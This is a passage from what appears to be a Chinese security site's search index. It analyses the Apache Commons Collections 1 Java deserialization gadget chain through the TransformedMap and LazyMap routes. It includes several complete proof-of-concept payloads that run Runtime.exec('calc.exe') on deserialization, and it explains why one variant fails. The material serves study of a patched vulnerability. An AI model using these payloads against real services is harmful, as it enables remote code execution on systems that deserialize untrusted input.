\u5bf9\u8c61\u7684invoke\u65b9\u6cd5\uff0c\u7ee7\u800c\u89e6\u53d1\u4e86get\u65b9\u6cd5\uff0c\u7ee7\u800c\u89e6\u53d1\u4e86\u6f0f\u6d1e\u3002\u8fd9\u662f\u4e00\u4e2a\u5f88\u5999\u7684\u5730\u65b9 \u591a\u8bf4\u65e0\u76ca\uff0c\u6574paylaod\u5427 import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.annotation.Retention; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class test2 { public static void main(String[] args) throws Exception { ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] { String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class }, new Object[]{\"calc.exe\"})}); Map innermap = new HashMap(); Map outermap = LazyMap.decorate(innermap, chainedTransformer); Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class); cons.setAccessible(true); //\u5999\u5904 InvocationHandler handler = (InvocationHandler) cons.newInstance(Override.class,outermap);//\u83b7\u5f97\u4e00\u4e2aAnnotationInvocationHandler\u5bf9\u8c61 Map Prox = (Map) Proxy.newProxyInstance(outermap.getClass().getClassLoader(), outermap.getClass().getInterfaces(),handler);//\u521b\u5efa\u4e00\u4e2aMap\u7684\u4ee3\u7406\u7c7b\uff0c\u5176\u4ee3\u7406\u65b9\u6cd5\u4e3aAnnotationInvocationHandler\u5bf9\u8c61\u91cc\u7684invoke\u65b9\u6cd5 InvocationHandler handler1 = (InvocationHandler) cons.newInstance(Override.class,Prox); //\u5c06\u4ee3\u7406Map\u4f20\u5165\uff0c\u5f53\u4ee3\u7406Map\u88ab\u6267\u884c\u4efb\u4e00\u65b9\u6cd5\u65f6\uff0c\u6267\u884cinvoke\u65b9\u6cd5 // ObjectOutputStream a = new ObjectOutputStream(new FileOutputStream(\"a.bin\")); a.writeObject(handler1); ObjectInputStream b = new ObjectInputStream(new FileInputStream(\"a.bin\")); b.readObject(); } } \u603b\u7ed3 \u76ee\u7684\u5c31\u662f\u4e3a\u4e86\u6267\u884cAnnotationInvocationHandler \u7684invoke\u65b9\u6cd5\uff0c\u6211\u4eec\u901a\u8fc7\u5b9e\u4f8b\u5316\u4e00\u4e2aAnnotationInvocationHandler\uff08A1\uff09 \u7c7b\u5e76\u5728\u5b9e\u4f8b\u5316\u65f6\u7684\u53c2\u6570\u4e2d\u52a0\u5165\u4f20\u5165\u4e86LazyMap\u7684AnnotationInvocationHandler\uff08AP\uff09 \u7c7b\u7684\u52a8\u6001\u4ee3\u7406\uff0c\u5728A1\u6784\u9020\u65b9\u6cd5\u4e2d\u4f1a\u6709\u4e00\u4e2aAP.entryset\u7684\u4ee3\u7801\uff0c\u4ece\u800c\u89e6\u53d1\u7684AP.invoke\u3002 \u548cTransformMap\u4e00\u6837\u5728commons-collections 4 \u7248\u672c\u4e2d\u53ef\u89c1\uff0cLazyMap\u7684decorate\u65b9\u6cd5\u88ab\u5220\u9664\uff0c\u5bfc\u81f4\u8fd9\u4e2a\u94fe\u4e0d\u80fd\u6b63\u5e38\u6267\u884c\u3002","title":"Apache-Commons-Collections 1"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%201/Apache-Commons-Collections%201/#apache-commons-collections-1","text":"","title":"Apache-Commons-Collections 1"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%201/Apache-Commons-Collections%201/#_1","text":"\u7248\u672c \u73af\u5883 Transformer Map \u94fe RCE\u539f\u7406 TransformerMap\u7c7b Transformer\u7c7b ConstantTransformer InvokerTransformer ChainedTransformer \u89e6\u53d1 \u603b\u7ed3 LazyMap\u94fe RCE\u539f\u7406 \u89e6\u53d1 \u603b\u7ed3 title: Apache-Commons-Collections1 \u53cd\u5e8f\u5217\u5316\u5206\u6790 date: tags: java\u5f00\u53d1\u4e0e\u5b89\u5168","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%201/Apache-Commons-Collections%201/#_2","text":"CommonsCollections 3.1 - 3.2.1 JDK\u7248\u672c\uff1a1.7\uff088u71\u4e4b\u540e\u5df2\u4fee\u590d\u4e0d\u53ef\u5229\u7528\uff09","title":"\u7248\u672c"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%201/Apache-Commons-Collections%201/#_3","text":"<dependency> <groupId>commons-collections</groupId> <artifactId>commons-collections</artifactId> <version>3.2</version> </dependency>","title":"\u73af\u5883"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%201/Apache-Commons-Collections%201/#transformer-map","text":"","title":"Transformer Map \u94fe"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%201/Apache-Commons-Collections%201/#rce","text":"\u6211\u5728\u7f51\u4e0a\u627e\u5230\u4e86\u4e00\u5219\u5229\u7528\u4ee3\u7801\uff0c\u867d\u7136\u8fd9\u4e2a\u5229\u7528\u4ee3\u7801\u5f88\u7c97\u6d45\uff0c\u5e76\u6ca1\u6709CC\u94fe1\u7684\u89e6\u53d1\u8fc7\u7a0b\uff0c\u4f46\u662f\u5bf9\u4e8e\u8fd9\u6761\u94fe\u7684\u539f\u7406\u8fd8\u662f\u53ef\u89c1\u4e00\u6591\u7684\u3002 import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; public class test { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[] {\"calc.exe\"}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\"test\", \"xxxx\"); } }","title":"RCE\u539f\u7406"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%201/Apache-Commons-Collections%201/#transformermap","text":"TransformerMap\u7c7b\u662f\u9020\u6210\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u539f\u56e0\u4e4b\u4e00 TransformerMap\u662fapacheCommonsCollections\u91cc\u63d0\u4f9b\u7684\u4e00\u4e2a\u6570\u636e\u7c7b\u578b\u3002\u5b83\u53ef\u4ee5\u4fee\u9970\u4e00\u4e2aMap\u7c7b\u578b\u7684\u5bf9\u8c61\u3002\u5f53\u4fee\u9970\u8fc7\u7684Map\u6dfb\u52a0\u65b0\u5143\u7d20\u65f6\uff0c\u5b83\u4f1a\u8c03\u7528\u5728decorate\u91cc\u58f0\u660e\u597d\u7684Trasnformer\u7c7b\u7684transform\u65b9\u6cd5\u5e76\u4f20\u5165\u65b0\u6dfb\u7684\u952e\u540d\u6216\u503c\u540d\u3002 Map DecoratedMap = TransformedMap.decorate\uff08Map,keyTransformer,valueTransformer\uff09 keyTransformer\u548cvalueTransformer\u5206\u522b\u6307\u5411\u4e0d\u540c\u7684Transformer\u7c7b\u3002","title":"TransformerMap\u7c7b"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%201/Apache-Commons-Collections%201/#transformer","text":"\u6211\u4eec\u770b\u4e00\u4e0bTransformer\u7c7b \u53ef\u4ee5\u53d1\u73b0\u5b83\u53ea\u662f\u4e00\u4e2a\u501f\u53e3\uff0c\u4ed6\u7684\u65b9\u6cd5\u9700\u8981\u5176\u4ed6\u5b50\u7c7b\u5b9e\u73b0\u3002 \u5f53TransformerMap\u5728\u65b0\u6dfb\u5143\u7d20\u65f6\u5c31\u4f1a\u8c03\u7528decorate\u91cc\u8bbe\u5b9a\u597d\u7684Transformer\u7c7b\u7684transform\u65b9\u6cd5\u3002 \u5b83\u7684\u63a5\u53e3\u5b9e\u73b0\u7c7b\u6709\u4ee5\u4e0b\u51e0\u4e2a\u3002","title":"Transformer\u7c7b"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%201/Apache-Commons-Collections%201/#constanttransformer","text":"\u8fd9\u4e2a\u7c7b\u4e3b\u8981\u7684\u4e24\u4e2a\u65b9\u6cd5\u5c31\u662f\u8fd9\u4fe9\u4e86\u3002 public ConstantTransformer(Object constantToReturn) { this.iConstant = constantToReturn; } public Object transform(Object input) { return this.iConstant; } \u6ca1\u4ec0\u4e48\u597d\u8bf4\u7684\uff0c\u5c31\u662f\u628a\u4f20\u5165\u7684\u5bf9\u8c61\u539f\u539f\u672c\u672c\u8fd4\u56de\u3002","title":"ConstantTransformer"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%201/Apache-Commons-Collections%201/#invokertransformer","text":"\u4e5f\u662f\u4e24\u4e2a\u91cd\u8981\u65b9\u6cd5 public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; } public Object transform(Object input) { if (input == null) { return null; } else { try { Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); } catch (NoSuchMethodException var5) { throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' does not exist\"); } catch (IllegalAccessException var6) { throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' cannot be accessed\"); } catch (InvocationTargetException var7) { throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' threw an exception\", var7); } } } \u5c31\u662f\u4f20\u5165\u65b9\u6cd5\u540d\uff0c\u53c2\u6570\u7c7b\u578b\u548c\u53c2\u6570\uff0c\u7136\u540e\u901a\u8fc7\u53cd\u5c04\u6765\u6267\u884c\u8fd9\u4e2a\u65b9\u6cd5","title":"InvokerTransformer"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%201/Apache-Commons-Collections%201/#chainedtransformer","text":"\u4e5f\u662f\u4e24\u4e2a\u91cd\u8981\u65b9\u6cd5 public ChainedTransformer(Transformer[] transformers) { this.iTransformers = transformers; } public Object transform(Object object) { for(int i = 0; i < this.iTransformers.length; ++i) { object = this.iTransformers[i].transform(object); } return object; } \u5c31\u662f\u628a\u4f20\u5165\u7684\u591a\u4e2aTransfomer\u7c7b\u7684transformer\u65b9\u6cd5\u4f9d\u6b21\u6267\u884c\uff0c\u6bcf\u4e2atransformer\u65b9\u6cd5\u6267\u884c\u540e\u8fd4\u56de\u7684\u5bf9\u8c61\u4f1a\u88ab\u5f53\u505a\u4e0b\u4e00\u6b21\u6267\u884c\u7684\u65f6\u5019\u4f20\u5165\u7684\u53c2\u6570\u3002 \u901a\u8fc7\u4ee5\u4e0a\u4fe1\u606f\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u6e05\u6670\u7684\u770b\u61c2\u4e0a\u9762\u7684payload\u4e86\u3002 \u5148\u901a\u8fc7ConstantTransformer\u83b7\u5f97 Runtime\u7c7b\uff0c\u518d\u901a\u8fc7InvokerTransformer\u6267\u884cexec\u65b9\u6cd5\uff0c\u7136\u540e\u901a\u8fc7ChainedTransformer\u5c06\u4e24\u4e2a\u7c7b\u4e32\u8d77\u6765\uff0c\u8ba9InvokerTransformer\u4ee5ConstantTrasformer\u8fd4\u56de\u7684Runtime\u7c7b\u4e3a\u53c2\u6570\u6267\u884cexec\u65b9\u6cd5\uff0c\u8fbe\u5230RCE\u7684\u76ee\u7684\u3002","title":"ChainedTransformer"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%201/Apache-Commons-Collections%201/#_4","text":"\u89e6\u53d1\uff0c\u6211\u4eec\u9009\u62e9\u7684\u5730\u65b9\u662fsun.reflect.annotation.AnnotationInvocationHandler\u7684readObject\u65b9\u6cd5\uff08\u6ce8\u610f8u71\u4ee5\u4e0b\u624d\u80fd\u6709\u89e6\u53d1\u70b9\uff0c\u4e4b\u540e\u7684\u7248\u672c\u5df2\u88ab\u4fee\u590d\uff09 \u89e6\u53d1\u70b9\u4ee3\u7801\u3002 \u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\uff0c\u5b83\u5bf9\u4f20\u5165\u7684map\u7684\u6bcf\u4e00\u4e2avalue\u6267\u884c\u4e86setValue\u3002 \u53ef\u4ee5\u5f88\u660e\u663e\u7684\u53d1\u73b0\u4f1a\u5bf9\u503c\u8fdb\u884ctransform\u65b9\u6cd5\u3002\u4e5f\u5c31\u662f\u76f8\u5f53\u4e8e\u89e6\u53d1\u4e86\u4e00\u6b21Map.put()\u3002\u63a5\u4e0b\u6765\uff0c\u5c31\u662fpayload\u6784\u9020\u65f6\u95f4\u4e86\u3002 \u4f46\u662f AnnotationInvocationHandler \u662f\u5185\u90e8\u7c7b\u65e0\u6cd5\u76f4\u63a5\u5b9e\u4f8b\u5316\uff0c\u4f46\u5b83\u7684\u7236\u7c7bInvocationHandler\u53ef\u4ee5\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u53cd\u5c04\u5f97\u5230 AnnotationInvocationHandler \u6784\u9020\u65b9\u6cd5\uff0c\u7136\u540e\u5bf9\u5176\u4f7f\u7528newInstance\u518d\u5411\u4e0a\u8f6c\u578b\u4e3a\u7236\u7c7b InvocationHandler \u3002\u65e2\u7136\u8981\u83b7\u5f97\u5bf9\u8c61\uff0c\u6211\u4eec\u5c31\u5e94\u8be5\u5173\u6ce8\u4e00\u4e0b\u5b83\u7684\u6784\u9020\u65b9\u6cd5\u3002 AnnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2) { Class[] var3 = var1.getInterfaces(); if (var1.isAnnotation() && var3.length == 1 && var3[0] == Annotation.class) { this.type = var1; this.memberValues = var2; } else { throw new AnnotationFormatError(\"Attempt to create proxy for a non-annotation type.\"); } } \u8981\u4f20\u5165\u4e24\u4e2a\u53c2\u6570\uff0cvar2\u4e0d\u7528\u8bf4\u4e86\u5c31\u662f\u6211\u4eec\u4f20\u5165\u7684Map\uff0cvar1\u5462\uff1f\u662fAnnotation\u7c7b\uff0c\u5373\u6240\u6709\u6ce8\u91ca\u7c7b\u7684\u63a5\u53e3\u3002\u6211\u4eec\u5fc5\u987b\u5728\u6b64\u5904\u4f20\u5165\u4e00\u4e2a\u6ce8\u91ca\u7c7b\u624d\u80fd\u4f7fif\u5224\u65ad\u4e3a\u771f\uff0c\u624d\u80fd\u628a\u6211\u4eec\u7684\u53c2\u6570\u4e2d\u7684Map\u4f20\u5165\u3002 \u4f46\u662f\u5e76\u4e0d\u662f\u6240\u6709\u6ce8\u91ca\u7c7b\u4f20\u8fdb\u53bb\u90fd\u6709\u6548\uff0c\u6ce8\u91ca\u7c7b\uff08\u5b9e\u9645\u4e0a\u5c31\u662f\u63a5\u53e3\uff09\u5fc5\u987b\u6709\u5b9a\u4e49\u7684\u65b9\u6cd5\u624d\u80fd\u6b63\u5e38\u89e6\u53d1\u53cd\u5e8f\u5217\u5316\u3002\u5173\u4e8e\u6b64\u70b9\u6211\u4eec\u540e\u9762\u518d\u8be6\u7ec6\u8c08\u8c08\u3002 \u56e0\u4e3a\u518dreadObject\u65b9\u6cd5\u91cc\u6211\u4eec\u4f1a\u6267\u884c Map var3 = var2.memberTypes() \uff0c\u6211\u4eec\u770b\u770bmemberTypes\u6e90\u7801\u3002 \u53d1\u73b0\u662f\u8fd4\u56de\u6784\u9020\u65b9\u6cd5\u4e2d\u5b9a\u4e49\u597d\u7684memberTypes\u5c5e\u6027\u3002\u800c\u8fd9\u4e2amemberTypes\u5c5e\u6027\u53c8\u548c\u4e0a\u4e00\u884c\u7684var2\u5c5e\u6027\u6709\u5173\uff0cvar2\u5c5e\u6027\u53c8\u4e0egetDecalredMethods\u6709\u5173\u2026\u56e0\u6b64\u6211\u624d\u731c\u6d4b \u201c\u6ce8\u91ca\u7c7b\u5fc5\u987b\u6709\u5b9a\u4e49\u7684\u65b9\u6cd5\u624d\u80fd\u6b63\u5e38\u89e6\u53d1\u53cd\u5e8f\u5217\u5316 \u201c,\u5b9e\u9645\u7ed3\u679c\u786e\u5b9e\u5982\u6b64\u3002 \u76ee\u524d\u627e\u5230\u7684\u80fd\u591f\u6b63\u5e38\u89e6\u53d1\u6f0f\u6d1e\u7684\u6ce8\u91ca\u7c7b\u6709 Target Retention SuppressWarnings .\u65e0\u4e00\u4f8b\u5916\u4ed6\u4eec\u4f5c\u4e3a\u63a5\u53e3\u90fd\u5b9a\u4e49\u4e86\u65b9\u6cd5\u3002\u800c\u4e14\u5728\u6211\u7ffb\u9605\u4e00\u4e9b\u53c2\u8003\u6587\u6863\u540e\uff0c\u53d1\u73b0\u786e\u5b9e\u662f\u8fd9\u6837 \u53e6\u5916\u4e00\u70b9\u9700\u8981\u6ce8\u660e\u7684\u662f\uff0cRuntime\u7c7b\u6ca1\u6709\u7ee7\u627fSerialize\u63a5\u53e3\uff0c\u4e5f\u5c31\u662f\u8bf4\u5b83\u4e0d\u80fd\u88ab\u76f4\u63a5\u5e8f\u5217\u5316\u3002 \u4e5f\u5c31\u662f\u8bf4\u5982\u679c\u6211\u4eec\u5728transformer\u94fe\u91cc\u60f3\u76f4\u63a5\u901a\u8fc7\u6709 new ConstantTransformer(Runtime. getRuntime ()) \u6765\u83b7\u53d6Runtime\u5bf9\u8c61\u65f6\uff0c\u4f1a\u53cd\u5e8f\u5217\u5316\u5931\u8d25\u3002 \u4f46\u662fClass\u7c7b\u662f\u6709\u7ee7\u627fSerialize\u63a5\u53e3\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7transformer\u94fe\u548c\u53cd\u5c04\u6765\u5728\u53cd\u5e8f\u5217\u5316\u9636\u6bb5\u9010\u6b65\u521b\u5efaRuntime\u7c7b\uff0c\u7ee7\u800c\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898 \u603b\u7ed3\u4e00\u4e0b\u51e0\u4e2a\u5751\u70b9\uff1a 1.Runtime\u7c7b\u4e0d\u80fd\u88ab\u5e8f\u5217\u5316 \\2. AnnotationInvocationHandler \u65e0\u6cd5\u76f4\u63a5\u5b9e\u4f8b\u5316\uff0c\u53ef\u901a\u8fc7\u53cd\u5c04\u83b7\u5f97\u5bf9\u8c61 3.\u6ce8\u610f\u5728\u5b9e\u4f8b\u5316 AnnotationInvocationHandler \u65f6\u8981\u4f20\u5165\u5b9a\u4e49\u597d\u65b9\u6cd5\u7684\u6ce8\u91ca\u7c7b OK\uff0c\u4ee5\u4e0a\u77e5\u9053\u4e86\u540e\u5c31\u80fd\u8bd5\u7740\u5199\u4e00\u4e0bpayload\u4e86\uff08\u8fd9\u4e2apayload\u4f9d\u65e7\u4e0d\u80fd\u6b63\u5e38\u6267\u884c\uff0c\u9519\u8bef\u51fa\u5904\u95f4\u4ee3\u7801\u6ce8\u91ca\uff0c\u5177\u4f53\u539f\u56e0\u770b\u4e0b\u6587\uff09\u3002 import java.io.*; import java.lang.annotation.*; import java.lang.reflect.*; import java.util.*; import org.apache.commons.collections.*; import org.apache.commons.collections.functors.*; import org.apache.commons.collections.map.TransformedMap; public class test2 { public static void main(String[] args){ try { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{new String(\"getRuntime\"),new Class[0]}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{new String(\"calc.exe\")}), }; ChainedTransformer chain = new ChainedTransformer(transformers); Map innermap = new HashMap(); innermap.put(\"sc\",\"b\"); //\u4e0d\u80fd\u6267\u884c\u7684\u539f\u56e0\u5728\u8fd9\u91cc\uff0c\u5982\u679c\u662fput(\"value\",\"a\")\u5c31\u53ef\u4ee5\u6b63\u5e38\u6267\u884c Map outmap = TransformedMap.decorate(innermap,null,chain); Class Annotation = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor AnnotationCons = Annotation.getDeclaredConstructor(Class.class,Map.class); AnnotationCons.setAccessible(true); InvocationHandler InvocationHandler = (InvocationHandler) AnnotationCons.newInstance(Target.class,outmap); ObjectOutputStream a = new ObjectOutputStream(new FileOutputStream(new File(\"a.bin\"))); a.writeObject(InvocationHandler); a.close(); ObjectInputStream b = new ObjectInputStream(new FileInputStream(\"a.bin\")); b.readObject(); b.close(); } catch (Exception e){e.printStackTrace();} } } \u4e3a\u4ec0\u4e48\u4e0d\u80fd\u6267\u884c\uff0c\u8fd9\u539f\u56e0\u4e0e\u4e0a\u9762\u63d0\u5230\u7684\u201c \u6ce8\u610f\u5728\u5b9e\u4f8b\u5316 AnnotationInvocationHandler \u65f6\u8981\u4f20\u5165\u5b9a\u4e49\u597d\u65b9\u6cd5\u7684\u6ce8\u91ca\u7c7b \u201d\u5f88\u6709\u5173\u8054\u3002 \u56e0\u4e3a\u6d89\u53caJVM\u7684\u4e00\u4e9b\u4e1c\u897f\uff0c\u6211\u4eec\u4e0d\u4f1a\u600e\u4e48\u53bb\u6df1\u7a76\uff0c\u5c31\u662f\u6d45\u6d45\u7684\u770b\u4e00\u4e0b\uff0c\u505a\u51fa\u4e00\u4e9b\u63a8\u6d4b\u3002 \u9996\u5148\u6211\u4eec\u5173\u6ce8\u5230 AnnotationInvocationHandler \u7684readObject\u3002 \u63a5\u4e0b\u6765\u5c31\u662f\u590d\u6742\u7684\u63a8\u7406\u4e86\uff0c\u5efa\u8bae\u5148\u628a\u5404\u65b9\u6cd5\u7684\u610f\u4e49\u5f04\u660e\u767d \u53d1\u73b0\u5fc5\u987b\u8981var7\uff01=null\u624d\u80fd\u6b63\u5e38\u89e6\u53d1\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u90a3\u4e48var7\u7684\u6765\u6e90\u662f\u4ece(Map)var3\u4e2d\u83b7\u5f97\u4ee5(String)var6\u4e3a\u952e\u540d\u7684\u503c\u3002var6\u662fvar3\u4e2d\u4e00\u9879\u7684\u952e\u540d\u3002\u800cvar3\u7684\u6765\u6e90\u662f(Annotation)var2\u7684menberTypes,\u6211\u4eec\u8ddf\u8fdb\u8fd9\u4e2a\u65b9\u6cd5\u3002 \u90a3\u4e48var1\u5c31\u662fAnnotationInvocationHandler\u7684type\u5c5e\u6027\u4e86\uff0c\u800c\u8fd9\u4e2atype\u5c5e\u6027\u5728\u5176\u6784\u9020\u65b9\u6cd5\u4e2d\u5c31\u5b9a\u4e49\u597d\u4e86\uff0c\u662f\u4f20\u5165\u7684\u6ce8\u91ca\u7c7b\u3002 \u4e5f\u5c31\u662f\u8bf4var1\u5c31\u662f\u6211\u4eec\u5728\u5b9e\u4f8b AnnotationInvocationHandler \u65f6\u4f20\u5165\u7684\u6ce8\u91ca\u7c7b\u3002 \u7ed3\u5408\u4ee5\u4e0a\u6d41\u7a0b\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u77e5\u9053\u8fd9\u4e2a\u8fc7\u7a0b\u662f: \u4ece \u5b9e\u4f8b AnnotationInvocationHandler \u65f6\u4f20\u5165\u7684\u6ce8\u91ca\u7c7b \u4e2d\u83b7\u53d6\u6700\u540e\u4e00\u4e2a\u65b9\u6cd5\uff0c\u7136\u540e\u628a\u5b83\u7f16\u5165\u4e3a\u4e00\u4e2aHashMap(\u4ee5\u4e0b\u79f0\u4e3a\u6ce8\u91ca\u65b9\u6cd5Map)\u7684\u4e00\u4e2a\u952e\u540d\u5e76\u7ed9\u4e88\u503c\u3002\u5728readObject\u65f6\u4f1a\u904d\u5386\u4f20\u5165\u7684Map\uff0c\u5982\u679c\u5728\u4f20\u5165\u7684Map\u4e2d\u627e\u5230\u4e86\u4e00\u9879\u7684\u952e\u540d\u5728\u6ce8\u91ca\u65b9\u6cd5Map\u4e2d\u5b58\u5728\uff08\u5373 \u5728\u4f20\u5165\u7684Map\u4e2d\u627e\u5230\u4e86\u4e00\u9879\u7684\u952e\u540d\u4e0e\u5b9e\u4f8b\u5316\u65f6\u4f20\u5165\u7684\u6ce8\u91ca\u7c7b\u7684\u6700\u540e\u4e00\u4e2a\u65b9\u6cd5\u540c\u540d\uff09\uff0c\u5219if\u6761\u4ef6\u4e3a\u771f\uff0c\u653b\u51fb\u6210\u529f\u3002 \u6240\u4ee5\u4e0a\u9762\u4e3a\u4ec0\u4e48put(\u201cvalue\u201d,\u4efb\u610f)\u624d\u80fd\u8fbe\u6210\u653b\u51fb\u7684\u539f\u56e0\u662f\uff0c Target Retention SuppressWarnings \u8fd9\u4e09\u4e2a\u6ce8\u91ca\u7c7b\u90fd\u6709\u4e14\u53ea\u6709\u4e00\u4e2a\u65b9\u6cd5\u540d\u4e3avalue\u7684\u65b9\u6cd5\u3002 \u5206\u6790\u5b8c\u4e86\u3002\u8fd9\u4e2a\u6d1e\u5229\u7528\u7248\u672c\u53ea\u80fd\u57288u71\u4ee5\u524d\uff0c\u6bd4\u8f83\u53e4\u8001\u65e0\u7528\u3002","title":"\u89e6\u53d1"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%201/Apache-Commons-Collections%201/#_5","text":"AnnotationInvocationHandler.readObject \u4f1a\u8c03\u7528\u4f20\u5165\u7684map\u4e2d\u6bcf\u4e00\u4e2avalue\u7684transformer\u65b9\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7ConstantTrasformer\u548cInvokerTransformer\u7ec4\u5408\u4e3a\u4e00\u4e2aChainedTransformer\u6765\u9010\u6b65\u8fd8\u539fRuntime\u7c7b\u5e76\u8c03\u7528\u5176exec\u65b9\u6cd5\u5b9e\u73b0\u547d\u4ee4\u6267\u884c\u3002 ConstantTransformer.transformer\u662f\u8fd4\u56de\u4f20\u5165\u7684\u7c7b\uff0cInvokerTransformer.transformer\u662f\u901a\u8fc7\u53cd\u5c04\u5bf9\u4f20\u5165\u7684\u65b9\u6cd5\u540d\u53c2\u6570\u540d\u7b49\u8fdb\u884c\u8c03\u7528\uff0cChainedTransformer.transformer\u662f\u5c06\u4f20\u5165\u7684transformer\u65b9\u6cd5\u6309\u987a\u5e8f\u6267\u884c\uff0c\u5e76\u5c06\u4e0a\u4e00\u4e2a\u65b9\u6cd5\u6267\u884c\u7ed3\u679c\u505a\u53c2\u6570\u4f20\u9012\u7ed9\u4e0b\u4e00\u4e2a\u65b9\u6cd5\u3002 \u5728cc4.0\u4e2d\u53ef\u4ee5\u53d1\u73b0TransformedMap\u7684decorate\u65b9\u6cd5\u88ab\u5220\u9664\u4e86\uff0c\u5bfc\u81f4\u8be5\u94fe\u4e0d\u80fd\u987a\u7545\u8fd0\u884c\u3002 jdk8u71 